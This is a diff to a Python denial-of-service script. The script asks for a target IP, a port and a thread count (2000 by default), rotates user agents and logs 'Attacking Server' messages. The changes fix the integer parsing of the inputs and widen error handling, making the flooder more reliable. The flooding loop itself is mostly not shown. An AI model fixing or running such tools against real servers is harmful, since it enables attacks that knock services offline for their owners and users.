@@ -31,8 +31,8 @@ address = ''
 while not address:
     address = input(f'Ip: ')
 
-port = input(f'Port {Fore.CYAN}(80 by default){Fore.RESET}: ') or 80
-threads = input(f'Threads {Fore.CYAN}(2000 by default){Fore.RESET}: ') or 2000
+port = int(input(f'Port {Fore.CYAN}(80 by default){Fore.RESET}: ') or 80)
+threads = int(input(f'Threads {Fore.CYAN}(2000 by default){Fore.RESET}: ') or 2000)
 
 # Starting fun
 user_agents = UserAgent()
@@ -67,10 +67,10 @@ def dos() -> None:
             # Simple logging
             current_time = time.ctime(time.time())
             print(f'{Fore.GREEN}{current_time} Attacking Server->{address}')
-        except socket.error:
+        except Exception as e:
             # Simple logging
             current_time = time.ctime(time.time())
-            print(f'{Fore.RED}{current_time} ERROR Attacking Server->{address}')
+            print(f'{Fore.RED}{current_time} ERROR {e} Attacking Server->{address}')
 
 
 # Here is some shit code
